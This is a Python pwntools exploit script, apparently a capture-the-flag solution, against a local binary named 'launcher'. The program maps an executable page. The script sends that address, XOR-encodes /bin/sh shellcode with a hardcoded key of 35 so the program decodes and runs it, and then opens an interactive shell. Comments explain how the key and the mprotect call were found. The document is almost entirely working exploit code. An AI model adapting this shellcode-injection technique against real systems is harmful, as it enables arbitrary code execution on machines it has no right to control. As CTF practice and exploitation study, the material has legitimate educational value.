#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template launcher
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('launcher')
context.terminal = "terminator -x".split()
# context.aslr = False

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# It can be seen with GDB+objdump that this program
# calls mprotect(0x603000, 1, PROT_READ | PROT_WRITE | PROT_EXEC).

# Secret XOR key is 35 (and it is hardcoded)

init_code_addr = '0x603000'

io = start()
# We pass init_code_addr, so that the program copies the subsequent
# input line from the fgets() input buffer to init_code_addr.
io.sendline(init_code_addr)

# Now assemble the shellcode to be sent to the program.
code = asm(shellcraft.sh())

# The program XORes each byte of the code sent with a 8-bit secret key.
# By experimentation (e.g. io.sendline("abcdefg"), it can be easily
# seen that the key is fixed and its value is 35. We can then XOR our
# code with the same key, so that it the program will decipher it
# and execute it.
ccode = [chr(ord(x) ^ 35) for x in code]
ccode = ''.join(ccode)
io.sendline(ccode)

# At this point the program has executed our code, which is a
# shellcode. Switch to interactive to use the shell.
io.interactive()

